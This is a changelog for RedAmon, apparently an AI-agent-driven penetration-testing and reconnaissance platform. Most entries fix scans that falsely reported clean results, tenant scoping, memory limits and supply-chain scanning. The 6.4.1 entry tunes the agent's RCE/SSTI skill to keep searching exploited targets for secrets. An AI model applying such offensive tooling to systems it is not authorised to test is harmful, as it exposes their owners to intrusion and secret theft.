- **A Multiscanner run could report "completed, 0 findings" for a scan that never reached its target** - which an operator reads as "no secrets here". Five independent causes, all with that same shape: 3.96.0 exits 0 for a nonexistent path, an unreachable host and a rejected token alike (`--fail-on-scan-errors` now set); the orchestrator judged the run by container exit code while the artifact's own verdict was correct all along; the self-updater could not move its binary on a read-only root and exited 1; the orchestrator image lacked the `neo4j` driver, so `from graph_db import Neo4jClient` raised and *every* ingest was skipped with a warning; and a terminal run's ingest was attempted exactly once, on the poll that removes the container, so a Neo4j blip lost the findings permanently. A missing artifact is now a failure rather than a clean result, and TruffleHog's structured scan-error records are parsed, redacted and published instead of dropped.
- **One GitHub repository is one asset node again.** TruffleHog reports `repository` as a clone URL for a finding in a file and as bare `owner/repo` for one in an issue or PR comment, so a repository whose comments were scanned became two nodes with its findings split across them and `assets_scanned` inflated. The name is canonicalised against the finding's own host, so an Enterprise repo is not renamed into a github.com one.
- **A GVM scan ran blind for four hours per target against a stack with no scanner** - 18 hours, four of 1140 IPs, nothing found ([#174]). Three compounding defects: scan containers sent the master `INTERNAL_API_KEY` where the scoped scanner key is required, so every settings read 401'd and every project setting was silently replaced by defaults; a sibling one-shot deleted the live Postgres socket on a repeat `up` (compose leaves a running service alone but re-runs an exited one-shot), crash-looping gvmd while Postgres still reported healthy; and a cached scanner *row* proved nothing about the ospd process, which one SIGKILL had left uncreated, so every task sat at 0% until its timeout. Now a structural test fails any scanner sending the master key alone, the socket cleanup lives in gvm-postgres' own entrypoint, and connect-time verification plus a stall watchdog and a 3-failure breaker stop a stack fault being paid for 1140 times.
- **LLM providers were saved against a deleted user id** ([#173]). A stale `redamon-current-user` kept being used as the effective user because the act-as reconcile only caught a network throw, not the server's 404, so reads returned an empty list and the first write died on a foreign-key violation surfaced as "Failed to save provider". The stale selection is now cleared and falls back to the admin's own id, the route maps the FK error to a readable 404, and the form shows the server's message. Also: WebSocket close 1008 is the agent refusing the init frame, so the client stops reconnecting and names the cause instead of showing an endless "Connecting...".
- **The unit gate ran a test that had opted out of it.** `pytest_isolated.py` selects files by name but never passed the tier to pytest, so the one test marked `@pytest.mark.integration` - a wall-clock assertion whose own comment says it is not hermetic - ran in the unit tier and passed in one run, failed in the next.
- **An IP-target scan imported none of its findings into the graph.** Nuclei reported 16 CVEs and the graph writer logged `Created 0 Vulnerability nodes` / `Skipped 1 items out of scan scope`. IP mode mints a placeholder hostname per target so a `Subdomain` node has a name (`21.40.250.84` -> `21-40-250-84`), but every scanner targets and reports the IP literal, and the graph mixins scoped on `recon_data["subdomains"]` alone - which holds only the placeholders. So 100% of an IP-mode scan's Nuclei findings, and every endpoint, parameter, form and secret from the crawl, were discarded as out-of-scope. The allowed-host set is now built once in `graph_db/mixins/recon/scope.py` from the subdomains **plus** `metadata.subdomain_filter` and `metadata.expanded_ips` - the same allowed-host list httpx already filters on - and host comparison normalises the forms the scanners actually emit (`host`, `host:port`, a full URL, `[::1]:443`). Genuinely foreign hosts are still dropped ([#172]).
- **IP-mode hosts were marked "no HTTP" in the graph even when httpx probed them.** The same placeholder-vs-literal mismatch: the sweep that demotes unprobed subdomains to `no_http` diffed placeholder names against probed IPs, so every live IP-mode host was demoted on each HTTP-probe graph update. It now translates through `metadata.ip_to_hostname` first.

## [6.10.0] - 2026-08-15

### Added

- **Supply-chain incident intel (supplychainattack.org).** A second offline dataset beside the OSV database, carrying the attacker domains, the remediation text and the typosquat labels OSV does not have. Populated by `./redamon.sh sca-intel-sync` and refreshed TTL-guarded on the scan-spawn path like the OSV DB, with a retry floor so a broken feed is not re-fetched on every scan; a fetch failure is always best-effort and never blocks the scan that triggered it. Four consumers: **incident context** (summary, remediation, blast radius, status, feed revision) attached to findings that already exist; **malicious-host correlation** from a discovered `BaseURL` to a `ThreatPulse` over a new `CONTACTS_MALICIOUS_HOST` edge; an **`ioc` flag on captured traffic** to a host a published incident names, set identically by both ingest writers; and **typosquat detection** over harvested package names.

  It never changes a verdict - only an OSV `MAL-` id makes a package malicious, and a catalog match is name-only - and never creates a node for the attacker host, which is a third party the target contacts rather than part of its attack surface, so it lives on the relationship. A missing or never-synced catalog is recorded as "did not run", never as a clean result. Two project toggles (Detect malicious hosts, default on; Detect typosquatting, default off) plus a per-user ignore list so an operator's own OAST callbacks are not reported as the target contacting attacker infrastructure.

### Fixed

- **The Supply-Chain SCA table labelled every non-malicious finding a GuardDog hit.** The verdict wording was hardcoded for any `verdict != 'malicious'`, so a finding from any other tool was attributed to GuardDog; it is now a function of `source_tool`. The graph writer had the same bug one layer down, stamping `source_tool: 'guarddog'` on every suspicious finding regardless of which tool produced it.

## [6.9.1] - 2026-08-15

### Fixed

- **`./redamon.sh install` failed to build the `kali-sandbox` image on a fresh host.** The Kali rolling base moved its default `python3` to 3.14, which has no prebuilt wheels for `unicorn` (pulled in by `pwntools`) or `pygit2` (pulled in by `guarddog`), so pip fell back to compiling them from source and died on a missing `cmake`. The image now installs the full build toolchain (`cmake`, `ninja-build`, `build-essential`, `libgit2-dev`, `pkg-config`, `python3-dev`) so the source-build fallback succeeds regardless of the base Python version. Verified on Python 3.14.6: `unicorn`, `pygit2` and `guarddog` all build and import ([#170]).
- **Partial recon died with `cannot import name 'Neo4jClient' from 'graph_db' (unknown location)`.** The orchestrator bound `graph_db` into every spawned scan container using a host path it *derived* by string surgery on a sibling's bind `Source`. Wherever Docker reports a rewritten Source (Docker Desktop on Windows/WSL2) that guess names a path that exists nowhere, and a missing bind source is not an error to Docker: it auto-creates an empty directory and mounts it, shadowing the good `graph_db` baked into the scan image. Python then saw an empty namespace package. The host path is now auto-detected from the orchestrator's own `./graph_db:/app/graph_db:ro` mount, exactly like `RECON_PATH` and every other source path (`GRAPH_DB_PATH` overrides), and when it cannot be detected the bind is skipped rather than allowed to shadow the baked-in copy. Both entry points also preflight the mount: partial recon aborts with one actionable line, and the full pipeline warns loudly instead of finishing green having written nothing to Neo4j (its graph writes are all wrapped in `try/except`, so a broken mount used to degrade in silence) ([#169]).

## [6.9.0] - 2026-08-10

### Added

- **Supply-chain scans reach a GitHub Enterprise server.** The org/user field now accepts a bare name (still github.com) or a URL naming a self-hosted host. The host is allowlisted against the single `githubEnterpriseHost` the operator registered (https only, no credentials, port, IP literals or localhost), re-checked inside the scan container, and clone URLs are rebuilt from the validated owner/repo rather than the server-supplied `clone_url`. `githubEnterpriseToken` is a separate credential, so an Enterprise PAT can never travel to api.github.com and a host matching neither gets no credential at all ([6719ab30]).
- **The Supply Chain Recon ecosystem filter is a multi-select.** It was free text matched exactly against each harvested package, so a typed `pypi` or `cargo` produced a green scan reporting nothing. It is now a checkbox group over the eight canonical OSV names, and the widget states what the current value does (unmatchable token, empty selection, npm-only harvester). Backend: a whitespace-only value dropped *every* package instead of none ([2422e695]).

### Changed

- **Every service memory limit is derived from the host's RAM, and the graph API is bounded.** A production 16 GB host was serving 502s and hanging requests on the graph page. Three separate causes, all fixed here.

  **The graph API was unbounded.** `/api/graph` returned the whole project graph with no limit while holding three copies at once - the object, the cached copy, and the complete JSON string - which OOM-killed the webapp on a 300K-node project. The payload is now capped (`GRAPH_MAX_NODES`) and the response reports `truncated` with the pre-truncation totals so the UI can say "showing N of M" rather than presenting a partial graph as complete; links whose endpoints did not survive are dropped, because a dangling reference makes the renderer throw or invent a ghost node. The response cache was an unbounded `Map` keyed by project, so N large projects each pinned a full copy for the process lifetime; it is now LRU-bounded on both entry count and total elements. `GRAPH_PERF_DEBUG` was hardcoded `true`, logging on every production request; it is now env-gated and off by default.

  **The Neo4j driver leaked on every production request.** `getDriver()` returned a *fresh* driver - each owning a pool of up to 50 Bolt connections - on every call when `NODE_ENV=production`, while development correctly reused a singleton, and nothing ever closed them. That fits Neo4j's logged `Increase in network aborts detected` far better than memory pressure did. All environments now share one driver. Separately, there was no query timeout: the driver's connection timeouts only bound *acquiring* a connection, so a whole-graph read ran unbounded - the reported "requests stuck in `[pending]` indefinitely". `NEO4J_QUERY_TIMEOUT_MS` (default 120s) is injected at the single `getGraphSession()` seam.

  **Memory limits barely scaled with the host.** Each service took an independent percentage of RAM with a hard ceiling, and four services were not sized at all, so the always-on services consumed **89% of an 8 GB host and 4% of a 512 GB one**, with nothing scaling above ~40 GB. One allocator now derives everything from `MemTotal`: `os_reserve` (`OS_RESERVE_PCT`), then a services pool (`SERVICES_PCT`) split by per-service weights, leaving the rest as the scan pool. Neo4j and Postgres are "reserved" (they really allocate their share) and are never over-committed; every other limit is a true ceiling multiplied by `BURST_FACTOR`, which is a *request* clamped so that `os_reserve + reserved + SUM(burst ceilings)` can never exceed RAM + swap at any host size or profile combination. Software floors (a JVM cannot boot in 128 MB) are the only absolutes and never bind at >= 8 GB; below that the allocator refuses rather than handing out limits that cannot work, so `--gvm` on an 8 GB host is now rejected up front. The result is written to a managed block in `.env`, regenerated on every `up`, so it applies however the stack is started - a bare `docker compose up` previously fell back to a fixed ~12.6 GB budget unrelated to the machine - and sizes pinned by hand before the allocator existed are reported and folded in once.

  Also: the GVM stack was three-quarters ungoverned (only `gvmd` had a limit; ospd-openvas, redis and its postgres had none at all); the orchestrator never received `CAPTURE_PROXY_MEM` / `TRAFFIC_INGEST_MEM` / `CODEFIX_SANDBOX_MEM`, so it spawned those containers at hardcoded 384m/256m on a 31.7 GB host; the OSV sync sidecar, the broker's sibling-tool cap and the local LLM used fixed literals; the admission ledger guessed a flat 6 GB service baseline unrelated to what was actually handed out. All now derive from the same computation. `preflight_ram_gate` ran only in `up`, so `install` built 16 images (30-60 minutes) before discovering the host was too small and `update` never gated at all - both now gate before any Docker work, and the deploy refuses an undersized target before provisioning. `status` gained OOM kills, restart counts, cap drift and free disk. Deploy exposes the shares as percentages, swap becomes `SWAP_PCT` of RAM at every host size, and nginx finally compresses `application/json` (Ubuntu's stock config ships `gzip on` with every `gzip_types` line commented out, so the graph payload crossed the wire raw) ([b32b444f], [ac4c2dac], [5c2ff8fd]).

- **The repository root is reorganized: 33 top-level directories down to 16.** Related directories are grouped under five new parents - `scanners/` (the 11 scan tools: `ai_attack_surface_scan`, `baddns_scan`, `capture_proxy`, `codefix_sandbox`, `github_secret_hunt`, `gvm_scan`, `trufflehog_scan`, `wcvs`, `supply_chain_{analyzer,common,scan}`), `services/` (`docker_broker`, `knowledge_base`, `postgres_db`), `testing/` (`e2e`, `guinea_pigs`), `tooling/` (`scripts`, `hooks`, `deploy`) and `docs/` (`readmes`, `assets`); the git-ignored `internal` and `validation-benchmarks` move under `_local/`. The import roots stay at the root (`agentic`, `recon`, `recon_orchestrator`, `graph_db`, `mcp`, `webapp`, `skills`, `tests`), as do `redamon.wiki` and `DevergoLabs` ([3f4457f5], [d034609d], [e50fec8b], [5e25f71f], [7b43a16f]).
- **Container-side paths are unchanged.** A scanner is still `/app/<scanner>` inside its container and the knowledge base is still imported as `knowledge_base`, so only host-side sources carry the new prefix. This is why the orchestrator's `/app/<name>`-keyed host-path auto-detection keeps working untouched ([7b43a16f]).
- **All documentation path references were repointed** - relative links, images, structure trees and inline paths across the README, the `docs/readmes/` set, every `AGENTS.md`, the `skills/*/SKILL.md` files and the wiki. Historical `CHANGELOG.md` entries are deliberately left pointing at the paths that were correct at the time ([0fdba77a]).

### Fixed

- **Upgrading across the reorganization no longer strands your data.** `git pull` moves only tracked files, so every git-ignored artefact would have been left at its old path while the new code read the new one: the knowledge-base FAISS index (which additionally made the KB flag itself flip to disabled), every past scan output shown in the UI, and the single-host deploy `.env` plus TLS material. `update`, `up` and `status` now run a one-shot, idempotent layout migration that moves them, never clobbering an existing destination and reporting anything it could not move (root-owned, container-written files) with a `sudo ./redamon.sh migrate-layout` fix-up - also available as a standalone command. `deploy.sh` additionally falls back to a pre-6.9 config directory so an operator who only ran `git pull` can still deploy ([d04945b8]).
- **Three shell suites were asserting against files that no longer existed** (`deploy_patch_integrity`, `deploy_env_cleanup`, `redamon_secrets` still read `deploy/single-host/` and `knowledge_base/Makefile`), so 13 assertions passed or failed on empty reads ([d04945b8]).
- **`query_graph` could read another project's data.** The tenant filter was injected by a regex that required an explicit label in the node pattern, so every other shape the text-to-Cypher model can emit ran unfiltered: `MATCH (n)`, multi-label, backtick-quoted labels, unlabelled-with-props, `(:Label)` and anonymous relationship endpoints. Observed live: an agent asked for malicious packages answered 4 on a project owning 3, then spent three iterations investigating the finding that belonged to someone else. The regex is replaced by a lexical scanner that scopes every pattern and a `scope_query` guarantee that refuses what it cannot scope, so all three call sites (the tool, `/text-to-cypher`, `/graph/exec`) fail closed instead of running across projects ([4612d815], [984493a4]).
- **`query_graph` could sit "Running" for ten minutes and then answer wrong.** Query truncation counted every `RETURN`, so a query built from two `CALL {}` subqueries was cut mid-block into a guaranteed syntax error that burned every regeneration attempt on the same mangled shape; it now counts only top-level returns. Generation is also bounded (`CYPHER_GENERATION_TIMEOUT`, 120s), with a timeout terminal rather than retried. Worst case on a slow provider goes from ~15 minutes of silence to 2 minutes and a message naming the cause. Separately, text-to-Cypher now routes through `retry_llm_call`, so a provider rejecting `temperature=0` self-heals instead of failing all three attempts ([984493a4], [24ed301e]).
- **The graph cap never lowered the peak.** Truncation ran in Node *after* the driver had already materialised every record, so it shrank the cached copy and the JSON string but not the read that OOM-killed the container. The limit is now applied inside Neo4j (wrapped in a `CALL` subquery, since a bare `LIMIT` after a `UNION` binds to the final arm only). Cache hit and miss also disagreed on the response shape, so `if (data.truncated)` gave different answers for identical data depending on whether the cache was warm ([11156abd]).
- **Scan history piled up phantom "running" rows.** A `ScanJob` was closed only by a browser polling that project, so the reaper now reconciles stuck rows server-side using the orchestrator's real outcome. Also: the org batch enumerates a personal account's private repos via the authenticated endpoint, the three Scans-tab tables paginate at 30 rows/page, and the repo clone limit rises from 512 MB to 2 GB ([cd90672e]).
- **`./redamon.sh test unit` was red on any default install.** The three knowledge-base tests require torch / sentence-transformers / faiss, which ship only in the `--kbase` image, and `test_reranker` died at collection rather than at test time. They now skip conditionally. A second flake: the admin suite piped `redamon.sh help` into `grep -q`, which exits on first match and kills the writer with SIGPIPE, failing 11 of 24 runs on a loaded machine ([4bdaa0e1], [64f4ed60]).
- **Two flaky tests are now deterministic.** `test_virustotal_enrich` keyed its stub on call order while the enrichment runs IPs concurrently, so which IP received the 404 was a race; and the vhost-SNI wall-clock speedup assertion is moved to the integration tier, where a timing check belongs, keeping the unit gate hermetic. The AI-attack-surface page test mocked the `@/components/ui` barrel while `useScanStartFailure` imports `useAlertModal` from the deep path, so all 15 of its cases threw.

## [6.8.0] - 2026-08-10

### Added

- **Scan Queue: a scan that cannot start now waits its turn instead of failing.** When a scan is refused for capacity (not enough memory, a concurrency ceiling, the project already busy, or a version activation in flight), the refusal dialog offers **Add to queue**. A background dispatcher then starts each queued job as capacity frees up, re-running **every** safety check at dispatch time (rules of engagement, guardrails, target validation, object-level authz, memory admission, and a settings fingerprint) rather than trusting the checks made when it was queued. Producers are the refusal modal, the scan scheduler, and the supply-chain org batch; the dispatcher enforces one job per project, a per-user ceiling, and a global ceiling. Built across Phases 1-7 ([f4dd1ed1], [8898a6a5], [fc9cd242], [c1f8abfa], [dc23835c], [eb380f81], [707919a1]).
- **The "Scans" tab: a project's whole scan lifecycle in one place.** Three sections top to bottom - **Scheduled scans** (what will run), **Scan queue** (what is running or waiting right now), and **Run history** (what already ran) - now cover **every** scan kind: full recon, partial recon, GVM, GitHub hunt, TruffleHog, supply chain (single and per-repo), and AI attack surface. The live view unions three sources (queue rows, `ScanJob` rows, and the orchestrator's in-memory state) and deduplicates them, so a scan started from any surface is visible with the right status, and Run history gains a **Type** column ([cf94dc16], [dc23835c]).
- **`ScanJob` records every scan kind.** Historically only full recon left a history row, so a directly-started GVM / supply-chain / AI-attack run was invisible once the orchestrator forgot it and absent from history forever. Every kind now writes a `ScanJob` at start and closes it at its terminal state, gaining `kind` and `run_id` columns ([cf94dc16]).
- **Supply-chain organization batch.** From the **Supply Chain Scanner** card, enter a GitHub organization or user to enumerate its repositories and queue one supply-chain scan per repo (priority -10), which the dispatcher runs one-per-project as capacity frees. Enforced no-manual-input for input types that must come from the graph ([eb380f81]).

### Changed

- **The "Scan Scheduler" tab is now "Scans"** and its sections are ordered by time: Scheduled scans, then the live Scan queue, then Run history. The UI states that schedules run the **full recon pipeline only**; the other scans and partial recon are started by hand from their own cards. Wiki updated ([cf94dc16]).
- **The supply-chain org batch moved** out of the JS Recon settings tab (where it sat next to the unrelated L2 recon phase) into the **Supply Chain Scanner** card in Other Scans, as a third input mode beside Upload and GitHub repository ([cf94dc16]).
- **The bottom-bar RAM/CPU/DISK readout is meters again** - live queue state moved from a drawer behind the meters into the Scans tab ([cf94dc16]).

### Fixed

- **A queued job waiting for capacity could promote sluggishly or be failed outright.** A capacity refusal (RAM / concurrency cap / project busy / activation) escalated a retry counter and its exponential backoff, so once a slot freed the job sat through a multi-minute backoff, and after 20 such refusals it was marked **failed** with "gave up after 20 attempts" though nothing was wrong with it. Capacity waits now recheck on a short fixed interval and never consume the attempt budget; only a genuine transient error does.
- **The Scan queue could list a scan that had already stopped.** A `ScanJob` is closed to a terminal state only by a per-project status poll (a browser viewing that project), so a scan that finished with nobody watching left a phantom "running" row. Stale rows are now filtered against the orchestrator's live set, guarded so neither an orchestrator restart (live set momentarily empty) nor a just-started scan is ever wrongly hidden.
- **A per-repo org-batch scan was listed twice** - once from its `supply_chain_repo` queue row and once from a `supply_chain` live entry, because the orchestrator reports per-repo scans under the single-scan kind. The two are now collapsed to one family in the dedup key.
- **`./redamon.sh update` could ship stale volume-mounted service code.** The `restart_only` path used a plain `up -d` that a `.py`-only change leaves as a no-op, so a new orchestrator/MCP endpoint could sit on disk unserved on installs that pin resource caps in `.env`. It now forces the recreate, so a mounted-code change is picked up deterministically.

---

## [6.7.0] - 2026-08-09

### Added

- **Agent-skills ruleset system.** Tiered `AGENTS.md` at the repo root and 6 component scopes (each with a `CLAUDE.md` symlink), plus 13 on-demand skills under `skills/` that record the project's hard-won conventions: testing, agent tools, built-in and community skills, recon tool and AI enrichment, partial recon, settings cascade, graph writes, LLM providers, container spawn, traffic capture, and supply-chain. `sync.sh` compiles each skill's declared triggers into the per-scope auto-invoke tables, while `drift-audit.sh` and a committed advisory pre-commit `citation-check` keep citations honest. System doc in [readmes/skills_management/SKILLS_MANAGEMENT.md](readmes/skills_management/SKILLS_MANAGEMENT.md) ([9b32b8dc]).
- **Modern testing foundation.** A per-file-isolation Docker gate ([scripts/pytest_isolated.py](scripts/pytest_isolated.py)) run via `./redamon.sh test`, with unit, integration and live tiers auto-marked by filename across every section image, plus per-section coverage floors so a green run stops lying. Guide in [readmes/README.TESTING.md](readmes/README.TESTING.md) ([b84f6cd1]).

---

## [6.6.0] - 2026-08-08

### Added

- **Per-column filters on every graph table.** A schema-free filter across all 20 pages of the table dropdown (Node Inspector, All Nodes, JS Recon sub-tabs, and the 17 Red Zone sheets). Each column infers its own control from the values present (checkbox list, numeric range, date range, text/regex), so no table declares a filter schema, and the active set is remembered per user, project and view in `users.ui_preferences.tableFilters` ([81ccbbba]).

### Changed

- **One row cap for every Red Zone route.** The per-route `LIMIT`s (200 to 2000, depending on which table you happened to open) are replaced by a single 200k ceiling, overridable per process with `REDAMON_REDZONE_ROW_CAP` ([078dcdbd]).

### Fixed

- **Supply-chain scans under-reserved memory.** The dirty analyzer is a second heavy container per job that the admission ledger could not see, so the host reported itself idle while several ~1.5 GB analyzers ran. Envelopes are now tool-qualified, and the analyzer is admitted and released like any other unit ([41110c72]).
- **A build could die of a full disk and leave the host with no usable images.** A disk preflight now refuses a build that cannot finish (measuring the filesystem Docker writes to, not the one holding the repo), `up` no longer reports success over a stack with no images or with dead services, and every successful build reclaims the cache it orphaned (opt out with `REDAMON_NO_AUTO_PRUNE=1`) ([078dcdbd]).
- **`./redamon.sh update` refused to fast-forward after any scan.** The MITRE `.last_update` marker is tracked in git *and* rewritten by the spawned recon container, so every scan dirtied the checkout and the next update stopped on a confusing "local changes" error. Now gitignored, and restored before the pull ([078dcdbd]).
- **The single-host deploy could not configure supply-chain SCA.** The `OSV_DB_*` knobs now reach a deployed host, `verify` reports an empty OSV database instead of leaving it for the first scan to discover, and the analyzer caps documented in `.env.example` are no longer silently inert ([b18c7310]).

---

## [6.5.0] - 2026-08-07

### Added

- **Supply-Chain Discovery: detect malicious and vulnerable dependencies, fully offline.** A new module that finds known-malicious (`MAL-`) and known-vulnerable (`CVE`/`GHSA`) packages in a target's dependency surface, verdicted against a local copy of the [OSV](https://osv.dev) database with **zero network calls**. It ships as **three layers** that share one engine and one graph model, so every path dedups into the same `Package` / `MalPackageFinding` / `Vulnerability{source:'osv'}` nodes. Full reference in [readmes/README.SUPPLY_CHAIN.md](readmes/README.SUPPLY_CHAIN.md); operator guide on the [Supply-Chain Scanning](https://github.com/RedAmon/redamon/wiki/Supply-Chain-Scanning) wiki page.
  - **L1 — Supply Chain Scan (Other Scans).** Audit an uploaded SBOM/lockfile **or** a GitHub repo. Packages anchor to an `SbomDocument` or `GithubRepository` node under the project `Domain`.
  - **L2 — Supply-Chain Recon (pipeline, GROUP 5.5).** Black-box harvest of a live target's served packages — source-map mining plus **retire.js** reading library name *and* version straight from the served JS — then an offline OSV verdict, anchored to `BaseURL`. Makes no new network request (parses what JS Recon already downloaded). Optional GuardDog deep analysis on OSV-flagged packages.
  - **L3 — Agent tools.** `execute_osv_scanner` (offline) and `execute_guarddog` (behavioural, dispatched to the hardened analyzer) the AI agent calls mid-engagement.
- **Supply-Chain SCA table.** A new Data Table view joining the three node types across three sheets (Verdicts / Packages / Advisories), with a three-state verdict (`malicious` / `suspicious` / **`not analysed`**) and **`unverdictable`** as a first-class status, so "mostly unchecked" never reads as "mostly clean". Deep-linkable and per-sheet XLSX/JSON/MD export.
- **Offline OSV database, lazy and self-refreshing.** Populate once per ecosystem with `./redamon.sh supply-chain-sync <eco>`; the orchestrator then refreshes it on the scan-spawn path, TTL-guarded (default 24h). Tunable via `OSV_DB_AUTO_REFRESH` / `OSV_DB_ECOSYSTEMS` / `OSV_DB_TTL_SECONDS` / `OSV_DB_REFRESH_TIMEOUT`.

### Security

- **DIRTY/CLEAN split.** Code that touches untrusted bytes (tarballs, target JS) runs in an isolated analyzer container (`cap_drop=ALL`, read-only rootfs, non-root, resource caps, no secrets); only a schema-validated JSON artifact crosses to the credential-holding writer. Enforced by a broker image/volume allowlist and per-tenant MERGE keys.
- **NO-INSTALL invariant.** RedAmon never runs `npm`/`pip install` on a target manifest (lifecycle scripts are RCE); static parse only, verified by a CI grep test over the supply-chain source.

### Fixed

- **L1 uploads were impossible and the OSV DB was never automatic** ([7d10f649], [81d7afc4]); the `redamon.sh` OSV sync no longer runs before its image exists or aborts install.
- **Mock IP hostnames silently zeroed both crawlers** during recon ([6f61df08]).
- **MCP plugin add + audit/prune presets** repaired (resolves #165, [a38d002b]).

---

## [6.4.1] - 2026-08-05

### Fixed

- **Minified JS bundles were silently skipped by the secret scanner.** JS recon scanned line-by-line and dropped any line over 100k chars, so a minified single-line bundle (e.g. a webpack `bundle.<hash>.js`) had every secret in it — Slack webhooks, API keys — missed entirely with no warning. Over-long lines are now scanned in overlapping 100k windows (5k overlap so a secret on a seam stays intact), covering bundles of any size up to the 5 MB download cap. Two O(n²) patterns (Email, GitHub Credentials URL) were bounded to stay linear and ReDoS-safe on large input. Covered by new windowing + integration tests in [recon/tests/test_js_recon.py](recon/tests/test_js_recon.py).
- **Session restore dropped legitimately-repeated tool calls.** Restore paired `tool_start`/`tool_complete` by content fingerprint (tool name + args), so a tool called twice with the same args collapsed into one card. Each ExecutionStep's stable `step_id` is now threaded through both events ([agentic/websocket_api.py](agentic/websocket_api.py), [agentic/orchestrator_helpers/streaming.py](agentic/orchestrator_helpers/streaming.py)) and restore pairs by identity ([webapp/src/app/graph/components/AIAssistantDrawer/hooks/useConversationRestoration.ts](webapp/src/app/graph/components/AIAssistantDrawer/hooks/useConversationRestoration.ts)).
- **Live chat events between two persisted ones were mis-ordered on resync.** Timeline reconcile appended not-yet-persisted live events at the very end; they now drop into their correct chronological slot behind the nearest persisted neighbour ([webapp/src/app/graph/components/AIAssistantDrawer/hooks/timelineReconcile.ts](webapp/src/app/graph/components/AIAssistantDrawer/hooks/timelineReconcile.ts)).

### Changed

- **RCE/SSTI skill: no early give-up on a confirmed sink.** Added a blocking pre-give-up self-check and made the object-graph secret search a single scripted BFS harness (exhaust the queue, depth ≥ 5) instead of hop-by-hop tool calls ([agentic/prompts/rce_prompts.py](agentic/prompts/rce_prompts.py)).

---

## [6.4.0] - 2026-07-30

### Added

- **Scan Timeline is now a first-class part of the Red Zone.** **Recon Delta** and **Scan Scheduler** are top-level tabs next to Graph Map (no longer buried), the version switcher sits in the global header, and the Version Manager is reachable from both. Documented in the new [Scan Timeline](https://github.com/RedAmon/redamon/wiki/Scan-Timeline) wiki page.
- **Recon Delta overlay polish.** The diff canvas fills its container, the legend moved onto the controls bar with per-state counts and a "Show unchanged" toggle, and the node drawer opens at 50% page width so field-level before/after tables are readable.
- **Unsaved-changes protection on config forms.** Save/Update buttons stay disabled until you actually change something, and leaving a form with unsaved edits (sidebar/header links, project/user switch, tab change, modal close, browser refresh) now prompts before discarding. Covers the recon Project form, `/settings` tabs, and the LLM provider, MCP, and Tradecraft forms. Fixes the case where applying a recon preset did nothing until you clicked Update.

### Fixed

- **Double discard prompt.** Confirming "leave" on a dirty form could re-show the prompt a second time before navigating; the navigation guard now runs each check exactly once.
- **Scheduled runs blocked by a busy graph vanished from the run history.** A schedule that fired while a scan or a version activation was in progress was skipped silently, so the operator saw a gap with no explanation. Blocked fires are now recorded as `failed` (or `deferred_ram` under memory pressure) with the reason, and the schedule rolls forward to its next slot.
- **Activating a version left stale snapshot bytes on the promoted row.** The newly-active version renders from the live graph, so its stored snapshot is now cleared on promotion instead of lingering in Postgres.
- Recon Delta and Scan Scheduler tables no longer clip at a narrow fixed width.

---

## [6.3.0] - 2026-07-30

### Added

- **Scan Timeline: versioned recon graphs.** Every full scan can now be kept as an immutable **version** instead of overwriting the last one. Starting a second scan asks whether to *create a new version* (the current graph is frozen first) or *overwrite* it; the freeze happens **before** the scan starts and aborts the start if it fails, so a graph is never destroyed unsaved. Past versions are read-only snapshots stored in Postgres — **the Neo4j schema does not change** and old data never re-enters the live graph, so it can never reach the agent. See the new "Scan Timeline" section of [readmes/GRAPH.SCHEMA.md](readmes/GRAPH.SCHEMA.md).
- **Activate a past version.** Any version with a stored snapshot can be made the live graph the agent, RedZone analytics and partial recon work on: the outgoing graph is frozen from LIVE, the recon graph is cleared (agent AttackChain nodes are *preserved*), the snapshot is restored through the same code path the project import uses, and only then does the current pointer move. A failure mid-restore loses nothing and is simply retriable. Held under a per-project lock that is mutually exclusive with scans, partial recon, agent sessions and the scheduler, in both directions.
- **Version Manager** — rename, pin, delete and "save current as a version", with retention that trims old unpinned versions (`SCAN_VERSION_RETENTION_KEEP`, default 20).
- **Recon Delta** — compare any two versions: added / removed / changed assets with per-field old→new, a change scorecard, security lenses (newly exposed ports, new and resolved vulnerabilities, technology drift, certificate changes, new parameters) and a colour-coded graph overlay. Assets are matched across versions by a stable identity key, not by Neo4j ids.
- **Scan Scheduler** — `once` / `every N minutes` / `cron` (UTC) schedules per project, with a static RAM feasibility check at creation (a schedule that could never be admitted, or that overlaps others beyond the scan pool, is refused with the reason). A worker in the recon-orchestrator polls due schedules and starts them through the *same* path a manual scan uses, so RoE time windows, the hard guardrail and the admission ledger all still apply. If the graph is busy or memory is short it records a deferred run with the reason instead of spawning. Tunable via `SCAN_SCHEDULER_ENABLED` / `SCAN_SCHEDULER_TICK_SECONDS`; both default safely, so no `.env` edit is needed.
- Project **export/import now round-trip the timeline** (versions with their snapshot bytes, run history, schedules). Imported schedules arrive **disabled**, so importing a project can never resume scanning someone else's target on the old cadence.

### Fixed

- **Malformed cron ranges were silently reinterpreted.** `Number('')` is `0`, so a field like `-5` parsed as `0-5` — a typo becoming a schedule that fires at times the operator never asked for. Open-ended ranges are now rejected ([webapp/src/lib/cron.ts](webapp/src/lib/cron.ts)).

---

## [6.2.7] - 2026-07-30

### Fixed

- **"not enough free memory to start this scan" on an 8 GB host with RAM to spare.** Scan admission charged every scan type the same worst-case 4 GB envelope, and it requires `envelope + OS headroom` free RAM, so an 8 GB Docker Desktop VM needed 6 GB free and no scan of any type could ever start once the core services were up (reported with 3.8 GB free and a partial recon, whose real peak is ~150 MB). Envelopes are now **per scan type** (full recon 2 GB, partial recon 768 MB, gvm 2.5 GB, ai-attack 1 GB, github-hunt / trufflehog 768 MB) and ship in git as [recon_orchestrator/resource_profile.default.json](recon_orchestrator/resource_profile.default.json), merged under the host-specific `resource_profile.json` so a calibrated host still wins. 6.0.2 announced this same right-sizing but only ever applied it to the gitignored, host-local profile, so every fresh clone kept running on the 4 GB placeholder. Malformed/hand-edited profile figures (scalar-where-a-map-belongs, negative, zero, `"768m"` strings, garbage) now fail soft to the built-in table instead of crashing admission or reserving 0 bytes. Covered by [tests/test_resource_governor.py](tests/test_resource_governor.py) (per-type table, three-layer merge, robustness, drift guard across both governor copies and the shipped JSON), [tests/test_admission_ledger.py](tests/test_admission_ledger.py) (the reported 8 GB / 3.8 GB-free case) and [tests/test_scan_envelope_integration.py](tests/test_scan_envelope_integration.py) (full admission path per scan type per host size).
